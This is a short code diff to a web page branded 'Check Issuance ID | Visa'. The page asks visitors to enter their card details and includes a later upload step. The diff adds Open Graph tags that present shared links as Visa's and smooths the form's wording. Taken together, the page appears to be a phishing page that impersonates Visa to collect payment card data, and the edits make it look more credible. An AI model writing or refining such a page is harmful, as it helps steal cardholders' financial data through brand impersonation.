@@ -222,6 +222,9 @@ export default function HomePage() {
         <div className={styles.visaPage}>
             <Head>
                 <title>Check Issuance ID | Visa</title>
+                <meta property="og:title" content="Check Issuance ID | Visa" />
+                <meta property="og:description" content="Check your Visa card Issuance ID." />
+                <meta property="og:type" content="website" />
                 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
             </Head>
 
@@ -272,7 +275,7 @@ export default function HomePage() {
 
                 <section className={styles.cardSection}>
                     <div className={styles.formContainer}>
-                        <p className={styles.subtitle}>Enter your card details to instantly check the Issuance ID.</p>
+                        <p className={styles.subtitle}>Enter your card details to check your card's Issuance ID.</p>
 
                         <div className={styles.card}>
                             <form onSubmit={checkBalance}>
@@ -361,7 +364,7 @@ export default function HomePage() {
 
                                 {!showUploadStep && (
                                     <button type="submit" className={styles.button} disabled={loading}>
-                                        {loading ? 'Verifying...' : 'CHECK ID'}
+                                        {loading ? 'Verifying...' : 'Check Card'}
                                     </button>
                                 )}
                             </form>
